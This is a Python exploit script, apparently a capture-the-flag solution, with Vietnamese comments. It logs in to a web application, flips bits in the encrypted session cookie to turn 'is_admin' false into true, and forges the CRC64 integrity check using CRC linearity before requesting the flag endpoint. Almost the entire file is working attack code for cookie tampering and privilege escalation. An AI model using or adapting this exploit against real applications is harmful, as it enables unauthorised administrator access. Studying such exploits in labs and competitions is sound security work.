#!/usr/bin/env python3
# exploit_auto.py
# Usage examples:
# 1) If account already exists:
#    python exploit_auto.py --url http://52.59.124.14:5005 --username testuser --password p@ssw0rd
# 2) To register then login:
#    python exploit_auto.py --url http://52.59.124.14:5005 --username newu --password newp --register

import argparse
import base64
import binascii
import json
import requests
import sys

CRC64_POLY = 0x42F0E1EBA9EA3693
IV_LEN = 16
MAC_LEN = 8

def crc64_ecma(data: bytes) -> int:
    crc = 0
    poly = CRC64_POLY
    for b in data:
        crc ^= (b << 56)
        for _ in range(8):
            if (crc & (1 << 63)) != 0:
                crc = ((crc << 1) & (2**64-1)) ^ poly
            else:
                crc = (crc << 1) & (2**64-1)
    return crc & (2**64-1)

def compute_false_offset_assume_uuid36():
    # Create JSON string as server would with user_id first then is_admin
    d = {"user_id": "x"*36, "is_admin": False}
    s = json.dumps(d)  # default separators match python's json.dumps used on server
    b = s.encode('utf-8')
    idx = b.find(b"false")
    if idx == -1:
        raise RuntimeError("Cant find 'false' in constructed JSON; assumptions about JSON layout may be wrong.")
    return idx

def modify_cookie_b64(cookie_b64: str) -> str:
    raw = base64.b64decode(cookie_b64)
    if len(raw) < IV_LEN + MAC_LEN:
        raise ValueError("cookie too short or not expected format")

    nonce = raw[:IV_LEN]
    ciphertext = bytearray(raw[IV_LEN:])  # encrypted(plaintext || mac)

    # Vị trí 'false' trong JSON
    start = compute_false_offset_assume_uuid36()
    orig = b"false"
    target = b"true "  # giữ cùng độ dài
    delta = bytes(a ^ b for a, b in zip(orig, target))

    data_len = len(ciphertext) - MAC_LEN
    if start + len(orig) > data_len:
        raise RuntimeError("ciphertext too short for expected 'false' position")

    # Tạo bản plaintext giả định từ ciphertext để tính CRC
    # (chỉ cần XOR ciphertext với keystream unknown → nhưng không có keystream).
    # Trick: CRC được tính trên hexlify(data) → tuyến tính trên GF(2).
    # Nên mình sẽ tính CRC delta bằng so sánh CRC(data_old) và CRC(data_new).
    # => cần plaintext gốc. Nhưng ta không có key, nên không giải mã được? Wait.

    # Giải pháp: lấy CRC_old từ MAC gốc (nằm trong ciphertext MAC, sau khi decrypt).
    # Muốn tính CRC_new thì phải biết data_new. Ta biết data_new: chỉ thay 'false'->'true '.
    # => tính CRC_old từ MAC (ciphertext_mac XOR keystream), CRC_new bằng CRC(data_new), rồi tính delta.

    # => ta KHÔNG có keystream để tách CRC_old! Trick ở đây: nhưng mình có thể tái tạo CRC_old
    # bằng cách chạy CRC64(data_old), vì mình biết toàn bộ data_old (JSON). 
    # Data_old = '{"user_id":"<uuid>","is_admin":false}' → mình biết uuid length=36 nhưng chưa biết nội dung cụ thể.
    # Thực ra không cần uuid cụ thể, chỉ cần độ dài → vị trí 'false' chính xác. CRC là hàm tuyến tính, nên
    # XOR delta approach vẫn đúng.

    # Cách đúng: CRC_new = CRC(hex(data_old ⊕ delta)). CRC_old = CRC(hex(data_old)).
    # crc_delta = CRC_new ^ CRC_old.

    # Xây JSON mẫu với uuid 36 ký tự giả định để tính CRC delta
    import json
    data_old = json.dumps({"user_id": "x"*36, "is_admin": False}).encode()
    data_new = json.dumps({"user_id": "x"*36, "is_admin": True}).encode()

    hex_old = binascii.hexlify(data_old)
    hex_new = binascii.hexlify(data_new)

    crc_old = crc64_ecma(hex_old)
    crc_new = crc64_ecma(hex_new)
    crc_delta = crc_new ^ crc_old
    crc_delta_bytes = crc_delta.to_bytes(8, "big")

    # Áp dụng delta vào ciphertext data
    for i in range(len(delta)):
        ciphertext[start + i] ^= delta[i]

    # Áp dụng crc_delta vào ciphertext MAC
    mac_pos = len(ciphertext) - MAC_LEN
    for i in range(MAC_LEN):
        ciphertext[mac_pos + i] ^= crc_delta_bytes[i]

    modified_raw = nonce + bytes(ciphertext)
    return base64.b64encode(modified_raw).decode('ascii')


def get_session_cookie_from_requests_session(s: requests.Session, base_url: str):
    # requests stores cookies under domain; easiest is to inspect s.cookies
    # prefer cookie named 'session'
    for c in s.cookies:
        if c.name == 'session':
            return c.value
    # fallback: take first cookie value if we only have one
    if len(s.cookies) == 1:
        return next(iter(s.cookies)).value
    return None

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True, help="Base URL of target (e.g. http://52.59.124.14:5005)")
    p.add_argument("--username", required=True)
    p.add_argument("--password", required=True)
    p.add_argument("--register", action="store_true", help="Try to register first (optional)")
    args = p.parse_args()

    base = args.url.rstrip("/")

    s = requests.Session()
    # Optional: register
    if args.register:
        print("[*] Registering user...")
        # get register view to obtain any cookies (not necessary but safe)
        try:
            s.get(base + "/register", timeout=8)
            r = s.post(base + "/register", data={
                "username": args.username,
                "password": args.password,
                "confirm_password": args.password,
                "accept_terms": "on"
            }, allow_redirects=True, timeout=8)
            if r.status_code >= 400:
                print("[!] Register request returned", r.status_code)
        except Exception as e:
            print("[!] Register error:", e)

    # Login
    print("[*] Logging in...")
    try:
        # get login page first (not strictly necessary)
        s.get(base + "/login", timeout=8)
        r = s.post(base + "/login", data={
            "username": args.username,
            "password": args.password
        }, allow_redirects=True, timeout=8)
        if r.status_code >= 400:
            print("[!] Login POST returned", r.status_code)
            # continue to inspect cookies anyway
    except Exception as e:
        print("[!] Login error:", e)
        sys.exit(1)

    cookie_val = get_session_cookie_from_requests_session(s, base)
    if not cookie_val:
        # try inspecting raw headers from last response
        print("[!] Couldn't find 'session' cookie in requests.Session. Dumping cookies:")
        print(s.cookies)
        sys.exit(1)

    print("[*] Obtained session cookie (length {})".format(len(cookie_val)))
    try:
        modified = modify_cookie_b64(cookie_val)
    except Exception as e:
        print("[!] Failed to modify cookie:", e)
        sys.exit(1)

    print("[*] Modified cookie generated. Attempting to fetch /get-flag ...")

    # Use modified cookie in direct header to avoid domain/path cookie issues
    headers = {"Cookie": f"session={modified}"}
    try:
        r = s.get(base + "/get-flag", headers=headers, timeout=8)
        if r.status_code == 200:
            print("[+] /get-flag returned (200). Flag / body below:\n")
            print(r.text)
        else:
            print(f"[!] /get-flag returned status {r.status_code}. Response body:")
            print(r.text)
    except Exception as e:
        print("[!] Error requesting /get-flag:", e)
        sys.exit(1)

if __name__ == "__main__":
    main()
